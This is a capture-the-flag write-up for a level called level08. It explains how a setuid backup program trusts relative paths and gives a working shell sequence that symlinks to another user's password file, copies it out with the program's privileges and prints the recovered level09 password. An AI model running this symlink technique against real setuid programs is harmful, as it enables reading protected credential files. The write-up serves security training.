# level08

## Objective

Use the setuid backup program to copy `/home/users/level09/.pass` into a
location readable by `level08`, then use that password to access bonus level09.

## Vulnerability

The program opens its argument as the source file:

```c
source_file = fopen(argv[1], "r");
```

It independently builds the destination by prefixing the same argument with a
relative directory:

```c
char destination[100] = "./backups/";
strncat(destination, argv[1], 99 - strlen(destination));
open(destination, O_WRONLY | O_CREAT | O_TRUNC, 0660);
```

It also opens `./backups/.log` before processing the source. The program runs
with `level09` effective permissions but resolves all paths relative to the
caller's current working directory. It does not validate the source path or
ensure the backup target remains inside the original home directory.

## Exploit

Create a `level08`-owned temporary workspace with a world-writable `backups`
directory. Make the source argument a symlink to the protected password file:

```sh
workdir=/tmp/level08-copy-$$
mkdir "$workdir"
mkdir "$workdir/backups"
chmod 777 "$workdir/backups"
cd "$workdir"
ln -s /home/users/level09/.pass source
/home/users/level08/level08 source
cat backups/source
```

The program reads `source`, which resolves to `/home/users/level09/.pass` with
its setuid privileges. It writes the copied bytes to the separate relative path
`./backups/source`, inside the attacker-controlled temporary directory.

The final command printed:

```text
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

That recovered level09 password is recorded in `flag`.